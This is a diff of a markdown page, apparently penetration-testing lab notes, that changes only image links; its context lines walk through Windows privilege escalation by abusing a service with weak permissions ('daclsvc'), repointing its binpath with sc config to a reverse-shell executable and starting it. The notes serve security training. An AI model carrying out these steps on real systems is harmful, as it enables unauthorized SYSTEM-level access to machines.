@@ -8,9 +8,9 @@ Potential Rabbit Hole: If you can change a service configuration but cannot stop
 
 we use winPEAS to find services with insecure permissions
 
-![](../../../../.gitbook/assets/image%20%2877%29.png)
+![](../../../../.gitbook/assets/image%20%2882%29.png)
 
-![](../../../../.gitbook/assets/image%20%2887%29.png)
+![](../../../../.gitbook/assets/image%20%2898%29.png)
 
 Note that we can modify the “daclsvc” service.
 
@@ -20,7 +20,7 @@ We can confirm this with accesschk.exe:
  .\accesschk.exe /accepteula -uwcqv user daclsvc
 ```
 
-![](../../../../.gitbook/assets/image%20%2882%29.png)
+![](../../../../.gitbook/assets/image%20%2892%29.png)
 
 Check the current configuration of the service:
 
@@ -28,7 +28,7 @@ Check the current configuration of the service:
 sc qc daclsvc
 ```
 
-![](../../../../.gitbook/assets/image%20%2871%29.png)
+![](../../../../.gitbook/assets/image%20%2872%29.png)
 
 demand start means the service has to started manually he binary pathname is also available the service has no dependencies and it also should run with the system user permissions
 
@@ -38,7 +38,7 @@ Check the current status of the service:
 ​sc query daclsvc
 ```
 
-![](../../../../.gitbook/assets/image%20%2883%29.png)
+![](../../../../.gitbook/assets/image%20%2893%29.png)
 
 the service is stopped
 
@@ -52,7 +52,7 @@ then Reconfigure the service to use our reverse shell executable:
 sc config daclsvc binpath="\"C:\PrivEsc\reverse.exe\""
 ```
 
-![](../../../../.gitbook/assets/image%20%2879%29.png)
+![](../../../../.gitbook/assets/image%20%2885%29.png)
 
 Start a listener on Kali, and then start the service to trigger the exploit:
 
@@ -60,5 +60,5 @@ Start a listener on Kali, and then start the service to trigger the exploit:
 net start daclsvc
 ```
 
-![](../../../../.gitbook/assets/image%20%2878%29.png)
+![](../../../../.gitbook/assets/image%20%2884%29.png)
 
